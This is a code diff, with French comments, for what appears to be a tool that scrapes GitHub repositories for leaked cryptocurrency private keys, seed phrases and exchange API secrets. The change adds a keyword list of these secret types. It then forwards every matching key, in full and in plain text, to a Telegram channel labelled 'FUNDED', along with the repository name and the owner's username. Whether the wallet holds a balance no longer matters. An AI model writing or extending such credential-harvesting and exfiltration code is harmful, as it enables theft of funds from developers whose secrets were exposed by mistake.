@@ -344,32 +344,79 @@ ${fileContent}
               await sendTelegram(msg1, CHAT_ID_ALL);
               await sendTelegram(msg2, CHAT_ID_ALL);
 
-              // Si balance > 0, envoyer vers FUNDED aussi
-              if (balanceInfo.hasBalance) {
-                const fundedMsg = `
-🚨 *ALERTE CRITIQUE - FONDS !* 🚨
+              // Détecter si c'est une clé privée crypto
+              const isCryptoPrivateKey = [
+                'private_key', 'wallet_key', 'secret_key',
+                'eth_private_key', 'ethereum_private_key',
+                'bitcoin_private_key', 'btc_private_key',
+                'solana_private_key', 'sol_private_key',
+                'mnemonic', 'seed_phrase', 'recovery_phrase',
+                'binance_api_key', 'binance_secret',
+                'coinbase_api', 'kraken_api',
+              ].some(keyword => 
+                pattern.pattern_type.toLowerCase().includes(keyword) ||
+                pattern.pattern_name.toLowerCase().includes(keyword)
+              );
 
-💰 *Balance:* ${balanceInfo.balance} ${balanceInfo.currency} ($${balanceInfo.balanceUSD?.toFixed(2)})
-⛓️ *Blockchain:* ${balanceInfo.blockchain}
+              // ENVOI AUTOMATIQUE au canal FUNDED pour:
+              // 1. Si balance > 0
+              // 2. OU si c'est une clé privée crypto (NOUVEAU)
+              if (balanceInfo.hasBalance || isCryptoPrivateKey) {
+                // Déterminer la blockchain potentielle
+                let blockchain = 'Unknown';
+                const patternLower = pattern.pattern_type.toLowerCase();
+                if (patternLower.includes('eth') || patternLower.includes('ethereum')) {
+                  blockchain = '⟠ Ethereum';
+                } else if (patternLower.includes('btc') || patternLower.includes('bitcoin')) {
+                  blockchain = '₿ Bitcoin';
+                } else if (patternLower.includes('sol') || patternLower.includes('solana')) {
+                  blockchain = '◎ Solana';
+                } else if (patternLower.includes('mnemonic') || patternLower.includes('seed')) {
+                  blockchain = '🔑 Multi-chain (BIP39)';
+                } else if (patternLower.includes('binance')) {
+                  blockchain = '🅱️ Binance';
+                } else if (patternLower.includes('coinbase')) {
+                  blockchain = '🟦 Coinbase';
+                } else {
+                  blockchain = '🔐 Crypto Wallet';
+                }
 
-🔍 [${item.repository.full_name}](${item.repository.html_url})
-📁 \`${item.path}\`
+                // Message SIMPLE et BRUT
+                let fundedMsg = '';
+                
+                if (balanceInfo.hasBalance) {
+                  // Cas 1: Balance détectée
+                  fundedMsg = `
+🚨 *BALANCE POSITIVE !* 🚨
+
+💰 *${balanceInfo.balance} ${balanceInfo.currency}* ($${balanceInfo.balanceUSD?.toFixed(2)})
+⛓️ ${balanceInfo.blockchain}
+
+🔑 *CLÉ:*
+\`${fullKey}\`
+
+📍 ${item.repository.full_name}
 👤 @${item.repository.owner.login}
+                  `.trim();
+                } else {
+                  // Cas 2: Clé privée crypto (sans balance vérifiée)
+                  fundedMsg = `
+🔑 *CLÉ PRIVÉE CRYPTO*
 
-🔑 *CLÉ/ADRESSE COMPLÈTE:*
-\`\`\`
-${balanceInfo.address || fullKey}
-\`\`\`
+⛓️ ${blockchain}
 
-📄 *CONTENU FICHIER:*
-\`\`\`
-${fileContent}
-\`\`\`
+🔑 *CLÉ:*
+\`${fullKey}\`
 
-⚡ *ACTION URGENTE REQUISE !*
-                `.trim();
+📍 ${item.repository.full_name}
+👤 @${item.repository.owner.login}
+                  `.trim();
+                }
 
                 await sendTelegram(fundedMsg, CHAT_ID_FUNDED);
+                if (balanceInfo.hasBalance) {
+                  fundedCount++;
+                }
               }
             }
           }
